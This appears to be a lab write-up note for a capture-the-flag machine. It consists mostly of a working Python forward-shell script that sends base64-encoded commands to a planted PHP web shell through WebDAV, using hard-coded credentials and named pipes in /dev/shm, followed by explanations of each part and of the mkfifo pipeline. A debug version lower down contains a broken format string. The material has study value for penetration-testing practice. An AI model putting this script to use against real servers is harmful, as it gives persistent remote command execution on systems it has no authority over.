````
#!/usr/bin/python3

import requests
import sys
import pdb
import signal
from random import randrange
from base64 import b64encode

def def_handler(sig, frame):
    print("\n\n[!] Quitting...\n")
    sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

#mkfifo input; tail -f input | /bin/sh 2>&1 > output

#GLobal variables
main_url = "http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/cmd.php"
global stdin, stdouti
session = randrange(1, 9999)
stdin = "/dev/shm/stdin.%s" % session
stdout = "/dev/shm/stdout.%s" % session

def RunCMD(command):
   
    command = b64encode(command.encode()).decode()

    post_data = {
            'cmd' : 'echo "%s" | base64 -d | bash' % command
    }
    r = requests.post(main_url, data=post_data, timeout=2)

    return r.text

def WriteCMD(command):
	command = b64encode(command.encode()).decode()
    post_data = {
            'cmd' : 'echo "%s" | base64 -d > %s' % (command, stdin)
            }
    r = requests.post(main_url, data=post_data, timeout=2)

    return r.text

def ReadCMD():
    ReadTheOutput = """/bin/cat %s""" % stdout

    response = RunCMD(ReadTheOutput)

    return response


def SetupShell():
    NamedPipes = """mkfifo %s; tail -f %s | /bin/bash 2>&1 > %s""" % (stdin, stdin, stdout)
    try:
        RunCMD(NamedPipes)
    except:
        None

    return None

SetupShell()

if __name__ == '__main__':
    while True:
        command = input(">")
        WriteCMD(command + "\n")
        response = ReadCMD()

        print(response)
        ClearTheOutput = """echo '' > %s""" %stdout
        RunCMD(ClearTheOutput)
````

### Explanation
1. **Imports**:
    
    - `requests`: Library for making HTTP requests.
    - `sys`: Provides access to some variables used or maintained by the Python interpreter and to functions that interact with the interpreter.
    - `pdb`: Python Debugger module.
    - `signal`: Allows defining and handling signal events.
    - `randrange`: Generates a random integer within a specified range.
    - `b64encode`: Function to encode bytes-like objects using Base64 encoding.
2. **Signal Handler** (`def_handler`):
    
    - Defines a signal handler function to handle the SIGINT signal (Ctrl+C). Upon receiving SIGINT, it prints a message and exits the script.
3. **Global Variables**:
    
    - `main_url`: The URL of the web shell (`cmd.php`) hosted on the target server.
    - `session`: A random session ID used to create unique named pipes.
    - `stdin`: Path to the named pipe used for input.
    - `stdout`: Path to the named pipe used for output.
4. **Function Definitions**:
    
    - `RunCMD(command)`: Executes a command on the web shell and returns the output.
    - `WriteCMD(command)`: Writes a command to the input named pipe (`stdin`) for execution.
    - `ReadCMD()`: Reads the output from the output named pipe (`stdout`).
    - `SetupShell()`: Sets up a shell by creating named pipes and executing a command to continuously feed input to the web shell and capture output.
5. **SetupShell**:
    
    - Creates named pipes (`stdin` and `stdout`) using `mkfifo` and sets up a command (`tail -f`) to continuously feed input from `stdin` to the web shell and capture output to `stdout`.
6. **Main Execution**:
    
    - Inside the main block, an infinite loop is started to continuously prompt the user for commands.
    - Each command entered by the user is written to the input named pipe (`stdin`) using `WriteCMD`.
    - The output from the web shell is read from the output named pipe (`stdout`) using `ReadCMD`.
    - The output is then printed, and the output named pipe is cleared.

### Use of /dev/shm
The script creates two named pipes (FIFOs) in `/dev/shm`, named `stdin.<session>` and `stdout.<session>`. These pipes serve as temporary files for storing standard input and output for commands executed through the web shell.

Overall, this script provides a simple command-line interface for remotely executing commands on a target server via a web shell. It leverages named pipes for bidirectional communication with the web shell, allowing the user to send commands and receive output in real-time.
## Script construction:

In this part of the code, we set the mkfifo structure, we are considering the base64 encoding and testing if stdin.*randon_value* woks with debugger pdb

`#!/usr/bin/python3`

`import requests`
`import sys`
`import pdb`
`import signal`
`from random import randrange`
`from base64 import b64encode`

`def def_handler(sig, frame):`
    `print("\n\n[!] Quitting...\n")`
    `sys.exit(1)`

`#Ctrl+C`
`signal.signal(signal.SIGINT, def_handler)`

`#GLobal variables`
`main_url = "http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/cmd.php"`
`global stdin, stdout`
`session = randrange(1, 9999)`
`stdin = "/dev/shm/stdin.%s" % session`
`stdout = "/dev/shm/stdout.%s" % session`

`pdb.set_trace()` *debugger will stop here. with l we list the variables and with p stdin, we verify the value of this in that moment*

`def RunCMD(command):`
   
    `command = b64encode(command.encode()).decode()`

    `post_data = {`
            `'cmd' : '%s "%s" | base64 -d | bash' % command`
    `}`
    `r = requests.post(main_url, data=post_data)`
    
    `return r.text`

`def SetupShell():`
    `NamedPipes = """mkfifo input; tail -f input | /bin/bash 2>&1 > output"""`

`if __name__ == '__main__':`
    `while True:`
        `command = input(">")`
        `RunCMD(command)`

![[Pasted image 20240401140643.png]]

# Mkfifo

`mkfifo input; tail -f input | /bin/sh 2>&1 > output`

1. **`mkfifo input`**: This command creates a named pipe named `input`. Named pipes are special types of files that act as communication channels between processes. The `mkfifo` command creates the named pipe file in the current directory.
    
2. **`tail -f input`**: This command uses `tail` to continuously read data from the named pipe `input`. The `-f` option tells `tail` to follow the end of the file (or in this case, the named pipe), continuously displaying new lines as they are written to the pipe.
    
3. **`| /bin/sh`**: The output from `tail -f input` is piped (`|`) to the shell (`/bin/sh`). This means that the data read from the named pipe is passed as input to the shell process, allowing the shell to execute the commands received from the named pipe.
    
4. **`2>&1 > output`**: This part of the command sequence redirects the output (including any error messages) generated by the shell to a file named `output`. The `2>&1` redirects standard error (file descriptor 2) to the same location as standard output (file descriptor 1), effectively merging error messages with regular output. Then, `> output` redirects the merged output to the file named `output`, storing the results of the commands executed by the shell.
    

Overall, this command sequence creates a named pipe (`input`), continuously reads data from it using `tail`, passes the data to a shell process (`/bin/sh`), and redirects the output of the shell (including errors) to a file named `output`. This can be used to interactively execute commands in the shell and capture their output in a file.